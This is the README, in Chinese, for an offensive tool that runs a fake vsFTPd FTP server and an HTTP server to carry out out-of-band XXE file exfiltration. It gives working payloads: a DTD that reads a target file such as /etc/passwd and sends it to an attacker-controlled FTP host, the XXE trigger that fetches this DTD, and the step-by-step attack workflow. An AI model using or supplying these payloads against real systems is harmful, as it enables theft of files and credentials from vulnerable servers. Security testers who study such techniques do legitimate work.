# fake-ftp-server

一个模拟 vsFTPd 的假 FTP 服务器，结合 HTTP 服务器提供 DTD 文件，用于 XXE 漏洞利用。

## 功能

- 假 FTP 服务器：模拟 vsFTPd 3.0.3，接收并记录 XXE 攻击获取的文件内容
- HTTP 服务器：动态生成 `data.dtd` 文件，自动配置服务器 IP、FTP 端口和目标文件路径

## 使用方法

```bash
# 基本用法
python3 fake-ftp-server.py <ftp_port> [选项]

# 启动 FTP + HTTP 服务器
python3 fake-ftp-server.py 2121 --http-port 8087

# 指定目标文件和公网 IP
python3 fake-ftp-server.py 2121 --http-port 8087 --file /etc/passwd --ip 192.168.1.100

# 保存捕获的数据到文件
python3 fake-ftp-server.py 2121 --http-port 8087 --output data.log
```

## 命令行参数

| 参数 | 说明 |
|------|------|
| `port` | FTP 服务器监听端口 (必需) |
| `-w, --http-port` | HTTP 服务器端口 (用于提供 data.dtd) |
| `--ip` | 公网 IP 地址 (默认自动检测) |
| `-f, --file` | 要读取的目标文件路径 (默认: /etc/passwd) |
| `-o, --output` | 捕获数据输出文件 |

## data.dtd 文件

当启用 HTTP 服务器时，会动态生成以下 DTD 内容：

```xml
<!ENTITY % file SYSTEM "file:///<file_path>">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://<ip>:<ftp_port>/%file;'>">
%eval;
%exfil;
```

其中：
- `<file_path>`: 由 `--file` 参数指定 (默认 `/etc/passwd`)
- `<ip>`: 由 `--ip` 参数指定或自动检测
- `<ftp_port>`: FTP 服务器端口

## XXE Payload 示例

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<ip>:<http_port>/data.dtd">
  %xxe;
]>
```

## 工作流程

1. 启动 `fake-ftp-server.py` 并指定 HTTP 端口
2. 向存在 XXE 漏洞的目标发送 XXE payload
3. 目标服务器请求 `http://<ip>:<http_port>/data.dtd`
4. HTTP 服务器返回动态生成的 DTD
5. 目标服务器读取指定文件并通过 FTP 发送
6. FTP 服务器捕获并显示文件内容
